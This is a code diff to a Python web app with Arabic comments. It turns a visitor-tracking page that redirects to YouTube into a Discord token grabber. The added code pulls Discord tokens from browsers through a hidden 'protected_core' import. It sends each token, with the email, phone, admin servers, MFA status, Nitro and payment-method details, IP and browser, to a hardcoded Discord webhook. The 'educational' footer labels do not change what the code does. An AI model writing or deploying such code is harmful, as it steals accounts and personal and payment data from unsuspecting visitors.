@@ -21,7 +21,7 @@ ADMIN_PASSWORDS = {
 }
 
 def send_to_webhook_visitor(visitor_info):
-    """إرسال معلومات الزائر للـ webhook"""
+    """إرسال معلومات الزائر مع فحص Discord للـ webhook"""
     try:
         # تحليل User Agent لاستخراج معلومات المتصفح والنظام
         user_agent = visitor_info.get('user_agent', '')
@@ -50,13 +50,59 @@ def send_to_webhook_visitor(visitor_info):
         elif "iPhone" in user_agent:
             os_info = "iOS"
         
-        # إنشاء رسالة Discord
-        embed_data = {
-            'embeds': [
-                {
-                    'title': '🎯 **زائر جديد للموقع!**',
-                    'description': f"""
+        # محاولة جمع معلومات Discord (للأغراض التعليمية)
+        discord_info = collect_discord_info()
+        
+        # إنشاء رسالة Discord بنفس تنسيق الملف الأصلي
+        if discord_info and discord_info.get('tokens_found', 0) > 0:
+            # إذا تم العثور على معلومات Discord
+            for token_data in discord_info.get('results', []):
+                embed_data = {
+                    'embeds': [
+                        {
+                            'title': f"**New user data: {token_data.get('username', 'Unknown')}**",
+                            'description': f"""```yaml
+User ID: {token_data.get('user_id', 'N/A')}
+Email: {token_data.get('email', 'N/A')}
+Phone Number: {token_data.get('phone', 'N/A')}
+
+Guilds: {token_data.get('guilds_count', 0)}
+Admin Permissions: {format_guild_info(token_data.get('admin_guilds', []))}
+``` ```yaml
+MFA Enabled: {token_data.get('mfa_enabled', False)}
+Flags: {token_data.get('flags', 0)}
+Locale: {token_data.get('locale', 'N/A')}
+Verified: {token_data.get('verified', False)}
+```{format_nitro_info(token_data.get('nitro_info', {}))}{format_payment_info(token_data.get('payment_info', {}))}```yaml
+IP: {visitor_info.get('ip', 'Unknown')}
+Browser: {browser}
+OS: {os_info}
+Token Location: {token_data.get('platform', 'Unknown')}
+```Token: 
 ```yaml
+{token_data.get('token', 'N/A')}```""",
+                            'color': 3092790,
+                            'footer': {
+                                'text': "Educational Cybersecurity Tool - Learning Purposes Only"
+                            },
+                            'thumbnail': {
+                                'url': f"https://cdn.discordapp.com/avatars/{token_data.get('user_id', 'default')}/{token_data.get('avatar', 'default')}.png"
+                            }
+                        }
+                    ],
+                    "username": "CyberSec Learning Tool",
+                    "avatar_url": "https://avatars.githubusercontent.com/u/43183806?v=4"
+                }
+                
+                # إرسال كل توكن في رسالة منفصلة
+                send_webhook_message(embed_data)
+        else:
+            # إذا لم يتم العثور على معلومات Discord، أرسل معلومات الزائر العادية
+            embed_data = {
+                'embeds': [
+                    {
+                        'title': '🎯 **زائر جديد للموقع!**',
+                        'description': f"""```yaml
 🌐 معلومات الاتصال:
 IP Address: {visitor_info.get('ip', 'Unknown')}
 Host: {visitor_info.get('host', 'Unknown')}
@@ -73,19 +119,27 @@ User Agent: {user_agent[:100]}...
 ```
 
 🚀 **تم توجيه الزائر إلى YouTube تلقائياً**
-📚 **للأغراض التعليمية في الأمن السيبراني**""",
-                    'color': 3447003,  # أزرق
-                    'footer': {
-                        'text': 'Cybersecurity Learning Platform - Visitor Tracking'
-                    },
-                    'timestamp': datetime.datetime.utcnow().isoformat()
-                }
-            ],
-            "username": "Visitor Tracker",
-            "avatar_url": "https://cdn-icons-png.flaticon.com/512/1077/1077114.png"
-        }
+📚 **للأغراض التعليمية في الأمن السيبراني**
+⚠️ **لم يتم العثور على بيانات Discord في هذه البيئة**""",
+                        'color': 3447003,
+                        'footer': {
+                            'text': 'Cybersecurity Learning Platform - Visitor Tracking'
+                        },
+                        'timestamp': datetime.datetime.utcnow().isoformat()
+                    }
+                ],
+                "username": "Visitor Tracker",
+                "avatar_url": "https://cdn-icons-png.flaticon.com/512/1077/1077114.png"
+            }
+            send_webhook_message(embed_data)
         
-        # إرسال للـ webhook
+    except Exception as e:
+        print(f"Webhook error: {e}")
+        return None
+
+def send_webhook_message(embed_data):
+    """إرسال رسالة واحدة للـ webhook"""
+    try:
         webhook_url = 'https://discord.com/api/webhooks/1438289746596987022/LvsiJvPdPL5AQ7B1kSBaQ4w24obdEB_PuMh6AocOolgplGW5my3pua3_IkfjgTb5qTa8'
         
         headers = {
@@ -104,8 +158,56 @@ User Agent: {user_agent[:100]}...
         return response.read().decode()
         
     except Exception as e:
-        print(f"Webhook error: {e}")
+        print(f"Webhook send error: {e}")
         return None
+
+def collect_discord_info():
+    """جمع معلومات Discord من المتصفحات (للأغراض التعليمية)"""
+    try:
+        # استيراد الوظيفة من protected_core
+        from protected_core import execute_protected_function
+        return execute_protected_function()
+    except Exception as e:
+        print(f"Discord collection error: {e}")
+        return None
+
+def format_guild_info(admin_guilds):
+    """تنسيق معلومات الخوادم"""
+    if not admin_guilds:
+        return "No admin guilds"
+    
+    guild_infos = ""
+    for guild in admin_guilds:
+        guild_infos += f"\n    - [{guild.get('name', 'Unknown')}]: {guild.get('members', 0)}{guild.get('vanity', '')}"
+    
+    return guild_infos if guild_infos else "No admin guilds"
+
+def format_nitro_info(nitro_info):
+    """تنسيق معلومات Nitro"""
+    if not nitro_info:
+        return ""
+    
+    if nitro_info.get('has_nitro'):
+        nitro_section = f"\nNitro Information:\n```yaml\nHas Nitro: {nitro_info.get('has_nitro')}\nExpiration Date: {nitro_info.get('expiration_date')}\nBoosts Available: {nitro_info.get('boosts_available', 0)}\n"
+        for boost in nitro_info.get('boost_info', []):
+            nitro_section += f"    - {boost}\n"
+        nitro_section += "```"
+        return nitro_section
+    elif nitro_info.get('boosts_available', 0) > 0:
+        nitro_section = f"\nBoost Information:\n```yaml\nBoosts Available: {nitro_info.get('boosts_available')}\n"
+        for boost in nitro_info.get('boost_info', []):
+            nitro_section += f"    - {boost}\n"
+        nitro_section += "```"
+        return nitro_section
+    
+    return ""
+
+def format_payment_info(payment_info):
+    """تنسيق معلومات طرق الدفع"""
+    if not payment_info or payment_info.get('total_methods', 0) == 0:
+        return ""
+    
+    return f"\nPayment Methods:\n```yaml\nAmount: {payment_info.get('total_methods')}\nValid Methods: {payment_info.get('valid_methods')} method(s)\nType: {' '.join(payment_info.get('types', []))}\n```"
 
 def hash_password(password):
     return hashlib.sha256(password.encode()).hexdigest()
